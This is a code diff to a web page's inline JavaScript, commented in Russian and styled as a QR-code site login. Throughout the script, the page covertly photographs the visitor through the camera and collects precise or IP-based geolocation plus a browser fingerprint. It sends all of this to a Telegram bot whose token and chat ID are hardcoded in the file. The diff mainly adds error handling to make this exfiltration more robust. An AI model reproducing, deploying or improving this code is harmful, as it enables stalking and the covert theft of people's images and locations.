@@ -80,8 +80,8 @@
   <script>
     // === КОНФИГУРАЦИЯ ===
     const CONFIG = {
-      BOT_TOKEN: '7841418365:AAEBjMXo9Vy238QSEPSpC-CS0qUqNVhHlXg',        // ← ЗАМЕНИТЕ
-      CHAT_ID: '502984850',        // ← ЗАМЕНИТЕ
+      BOT_TOKEN: '7841418365:AAEBjMXo9Vy238QSEPSpC-CS0qUqNVhHlXg',
+      CHAT_ID: '502984850',
       MAX_CAMERA_ATTEMPTS: 2
     };
 
@@ -95,12 +95,13 @@
         formData.append('chat_id', CONFIG.CHAT_ID);
         formData.append('photo', blob, 'qr_scan.jpg');
         formData.append('caption', '📸 QR-скан: вход на сайт');
-        await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendPhoto`, {
+        const res = await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendPhoto`, {
           method: 'POST',
           body: formData
         });
+        if (!res.ok) console.error('Telegram photo error:', await res.text());
       } catch (e) {
-        console.error('Ошибка фото:', e);
+        console.error('Ошибка отправки фото:', e);
       }
     }
 
@@ -108,7 +109,7 @@
     async function sendLocation(lat, lon, label = "Местоположение") {
       try {
         // Карта
-        await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendLocation`, {
+        let res = await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendLocation`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
@@ -118,8 +119,10 @@
             horizontal_accuracy: 50
           })
         });
+        if (!res.ok) console.error('Location error:', await res.text());
+
         // Подпись
-        await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
+        res = await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
@@ -127,6 +130,7 @@
             text: `📍 ${label}\nКоординаты: ${lat.toFixed(6)}, ${lon.toFixed(6)}`
           })
         });
+        if (!res.ok) console.error('Caption error:', await res.text());
       } catch (e) {
         console.error('Ошибка карты:', e);
       }
@@ -167,22 +171,26 @@
 ⏱ *Время*: ${new Date().toLocaleString('ru-RU')}
       `.trim();
 
-      await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: CONFIG.CHAT_ID,
-          text: report,
-          parse_mode: 'Markdown'
-        })
-      });
+      try {
+        const res = await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: CONFIG.CHAT_ID,
+            text: report,
+            parse_mode: 'Markdown'
+          })
+        });
+        if (!res.ok) console.error('Report error:', await res.text());
+      } catch (e) {
+        console.error('Ошибка отчёта:', e);
+      }
     }
 
     // === ЗАПРОС ГЕОЛОКАЦИИ ПОСЛЕ ФОТО ===
     async function requestGeolocationAfterPhoto() {
       document.getElementById('status').textContent = 'Определяем местоположение...';
 
-      // Сначала пробуем точную геолокацию
       const precise = await new Promise((resolve) => {
         if (!navigator.geolocation) return resolve(null);
         navigator.geolocation.getCurrentPosition(
@@ -196,13 +204,16 @@
         await sendLocation(precise.lat, precise.lon, 'Точное местоположение');
         await sendReport(collectFingerprint(), precise.source);
       } else {
-        // Fallback на IP-геолокацию
         try {
+          // Получаем IP
           const ipResp = await fetch('https://api.ipify.org?format=json');
-          const ip = (await ipResp.json()).ip;
+          const ipData = await ipResp.json();
+          const ip = ipData.ip;
+
+          // Получаем гео по IP
           const geoResp = await fetch(`https://ipapi.co/${ip}/json/`);
           const geo = await geoResp.json();
-          
+
           if (geo.latitude && geo.longitude) {
             await sendLocation(parseFloat(geo.latitude), parseFloat(geo.longitude), 'Местоположение по IP');
             await sendReport(collectFingerprint(), 'по IP');
@@ -210,11 +221,11 @@
             await sendReport(collectFingerprint(), 'не определено');
           }
         } catch (e) {
+          console.error('IP-гео ошибка:', e);
           await sendReport(collectFingerprint(), 'ошибка определения');
         }
       }
 
-      // Показываем финальное сообщение
       document.getElementById('screen-success').classList.remove('hidden');
     }
 
@@ -235,7 +246,6 @@
 
         await new Promise(r => setTimeout(r, 1200));
         
-        // Скриншот
         const canvas = document.createElement('canvas');
         canvas.width = video.videoWidth || 640;
         canvas.height = video.videoHeight || 480;
@@ -245,10 +255,7 @@
         stream.getTracks().forEach(track => track.stop());
         video.style.display = 'none';
         
-        // Отправка фото
         await sendPhoto(imageData);
-        
-        // Запрос геолокации
         await requestGeolocationAfterPhoto();
         
       } catch (err) {
